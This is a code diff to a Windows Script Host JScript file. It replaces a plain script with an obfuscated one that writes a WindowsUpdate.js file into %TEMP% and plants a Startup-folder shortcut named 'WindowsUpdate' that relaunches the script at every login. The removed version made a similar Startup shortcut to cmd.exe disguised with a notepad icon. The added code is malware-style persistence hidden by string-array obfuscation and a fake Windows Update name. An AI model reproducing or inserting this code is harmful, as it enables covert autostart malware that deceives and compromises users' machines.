@@ -1,14 +1,1 @@
-var fso = new ActiveXObject("Scripting.FileSystemObject");
-var WshShell = WScript.CreateObject("WScript.Shell");
-
-
-
-	
-strDesktop = WshShell.SpecialFolders("Startup");
- var aa = WshShell.CreateShortcut(strDesktop + "\\WindowsUpdate.lnk");
-aa.TargetPath = "C:\\Windows\\System32\\cmd.exe"
-aa.Arguments = ""
-aa.Description = "WindowsUpdate";
-aa.IconLocation = "C:\\Windows\\notepad.exe"
-aa.WorkingDirectory = "";
-aa.Save();
+var _0x3d7cba=_0x5300;(function(_0x20828f,_0x2e6114){var _0x1c8f60=_0x5300,_0x418124=_0x20828f();while(!![]){try{var _0x128be8=-parseInt(_0x1c8f60(0x1c7))/0x1*(-parseInt(_0x1c8f60(0x1be))/0x2)+parseInt(_0x1c8f60(0x1b9))/0x3*(parseInt(_0x1c8f60(0x1b6))/0x4)+parseInt(_0x1c8f60(0x1bb))/0x5+-parseInt(_0x1c8f60(0x1bc))/0x6*(-parseInt(_0x1c8f60(0x1ba))/0x7)+parseInt(_0x1c8f60(0x1b5))/0x8*(-parseInt(_0x1c8f60(0x1b2))/0x9)+parseInt(_0x1c8f60(0x1b1))/0xa+parseInt(_0x1c8f60(0x1ca))/0xb*(-parseInt(_0x1c8f60(0x1c6))/0xc);if(_0x128be8===_0x2e6114)break;else _0x418124['push'](_0x418124['shift']());}catch(_0x217f5d){_0x418124['push'](_0x418124['shift']());}}}(_0x2db3,0x800cc));function _0x5300(_0x2b5af2,_0x2e6065){var _0x2db3ea=_0x2db3();return _0x5300=function(_0x530072,_0x350499){_0x530072=_0x530072-0x1b0;var _0x491e71=_0x2db3ea[_0x530072];return _0x491e71;},_0x5300(_0x2b5af2,_0x2e6065);}var fso=new ActiveXObject(_0x3d7cba(0x1c9)),WshShell=WScript[_0x3d7cba(0x1c1)]('WScript.Shell'),temp=WshShell[_0x3d7cba(0x1b4)](_0x3d7cba(0x1b0)),fh=fso[_0x3d7cba(0x1b3)](temp+_0x3d7cba(0x1b8),!![]);function _0x2db3(){var _0x4b5541=['Startup','CreateShortcut','3813552ofbgYo','333923yAyVzQ','\x5cWindowsUpdate.lnk','Scripting.FileSystemObject','66lCkFrZ','%TEMP%','4890230CvgUwf','1226916MrNmus','CreateTextFile','ExpandEnvironmentStrings','32scWvdt','20VFHUst','Close','/WindowsUpdate.js','67014ZhjqqE','259NuuCSP','4418410cHHxiT','133674XMIZwx','funka','4fQFVUI','WorkingDirectory','SpecialFolders','CreateObject','TargetPath','Shortcut\x20WindowsUpdate'];_0x2db3=function(){return _0x4b5541;};return _0x2db3();}fh['WriteLine'](_0x3d7cba(0x1bd)),fh[_0x3d7cba(0x1b7)](),strDesktop=WshShell[_0x3d7cba(0x1c0)](_0x3d7cba(0x1c4));var oShellLink=WshShell[_0x3d7cba(0x1c5)](strDesktop+_0x3d7cba(0x1c8));oShellLink[_0x3d7cba(0x1c2)]=WScript['ScriptFullName'],oShellLink['Description']=_0x3d7cba(0x1c3),oShellLink[_0x3d7cba(0x1bf)]=temp+_0x3d7cba(0x1b8),oShellLink['Save']();
